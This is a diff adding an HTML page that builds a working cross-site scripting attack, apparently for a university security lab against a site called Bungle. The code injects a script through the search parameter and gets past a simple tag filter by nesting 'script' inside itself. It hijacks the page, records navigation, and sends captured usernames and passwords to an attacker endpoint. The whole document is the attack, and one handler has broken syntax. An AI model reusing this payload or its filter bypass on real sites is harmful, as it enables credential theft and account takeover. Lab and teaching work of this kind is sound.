@@ -1,0 +1,141 @@
+<body>
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+
+function makeLink(xssdefense, target, attacker) {
+    if (xssdefense == 0) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + 
+            encodeURIComponent("<script>" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">");
+    } 
+        // Implement code to defeat XSS defenses here.
+    else if (xssdefense == 1) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + 
+            encodeURIComponent("<scrscriptipt>" + payload.toString() + ";payload(\"" + attacker + "\");</scrscriptipt" + ">");
+
+    }
+}
+
+function payload(attacker) {
+    function log(attacker, data) { 
+        console.log($.param(data));
+        $.get(attacker, data);
+    }
+
+    function proxy(href,data,replace=0) {
+        $("html").hide();
+        $("html").load(href,data,function(){
+            history_handler(href,replace);
+            $("html").show();
+            navlog(href);
+            click_case();
+        });
+    }
+
+    function history_handler(href, replace){
+            if (!replace) {
+                console.log(window.history);
+                window.history.pushState({html:  $("html")}, null, href);
+            }
+            else {
+                window.history.replaceState({html: null}, null, href);//current state
+                // window.history.pushState({
+                //     url: href}, null, href);
+                console.log("replace = 1")
+                console.log(window.history);
+            }
+            window.onpopstate = function(event) {//backward
+                if(event.state.html != null){
+                    event.state.html.load});
+                }
+                //proxy(event.state.url, null, 1);//what if 0 not replace??
+                event.preventDefault();
+                console.log(window.history);
+                };
+            // window.onbeforeunload = function(event){
+
+            //     proxy(event.state.url, null, 1);//what if 0 not 
+            // }
+    }
+
+    function navlog(href){
+        if($("#logged-in-user").length){
+             log(attacker, {event: "nav", 
+                 user:$("#logged-in-user").text(), url:href});
+        }
+        else{
+            log(attacker, {event: "nav", url:href});
+        }
+    }
+
+    function click_case(){
+        //case 1 login button
+        $("#log-in-btn").click(function(event){
+            event.preventDefault();
+            var target = './login';
+            var request = {username: $('#username').val(),
+                            password: $('#userpass').val()
+                        };
+            var logdata = { event: "login",
+                            user: $('#username').val(),
+                            pass: $('#userpass').val()
+                        };
+            log(attacker, logdata);
+            proxy(target, request);
+        });
+        $("#new-account-btn").click(function(event){
+            event.preventDefault();
+            var target = './create';
+            var request = {username: $('#username').val(),
+                            password: $('#userpass').val()
+                        };
+            var logdata = { event: "login",
+                            user: $('#username').val(),
+                            pass: $('#userpass').val()
+                        };
+            log(attacker, logdata);
+            proxy(target, request);
+        });
+        //case 2 serach
+        $("#search-btn").click(function(event){
+            event.preventDefault();
+            var target = './search' + '?q=' + $("#query").val();
+            var request = {query: $("#query").val()};
+            //log(attacker, logdata);
+            proxy(target, null); //GET
+        });
+        //case 3 logout
+        $("#log-out-btn").click(function(event){
+            event.preventDefault();
+            var target = './logout';
+            var logdata = { event: "logout",
+                            user: $("#logged-in-user").text()
+                        };
+            log(attacker, logdata)
+            proxy(target, {}); //logout is post
+        });
+        //case 4 search again
+        $("#search-again-btn").click(function(event){
+            event.preventDefault();
+            var target = './';
+            proxy(target, null);
+        });
+
+    }
+    //first time pyload do:
+    proxy("./",null,1);
+}
+
+var xssdefense = 1;
+var target = "http://bungle-cs461.cs.illinois.edu/";
+var attacker = "http://127.0.0.1:31337/stolen";
+// similar to onload (window.onload)
+$(function() {
+    var url = makeLink(xssdefense, target, attacker);
+    $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+});
+
+
+</script>
+<h3></h3>
+</body>
